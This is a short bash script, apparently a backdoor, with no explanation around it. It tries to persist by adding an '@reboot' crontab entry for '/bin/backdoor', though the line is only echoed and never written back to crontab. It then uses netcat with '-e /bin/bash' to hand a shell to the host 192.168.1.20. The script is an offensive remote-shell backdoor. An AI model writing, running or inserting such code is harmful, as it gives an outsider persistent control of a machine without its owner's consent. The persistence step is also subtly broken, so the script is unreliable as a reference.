#!/bin/bash
SCRIPT="/bin/backdoor"
#Make persistent
crontab -l | grep -q $SCRIPT
if [ $? -ne 0 ]; then
    (crontab -l; echo "@reboot $SCRIPT")
fi

IP="192.168.1.20"
nc $IP -p 1234 -e /bin/bash
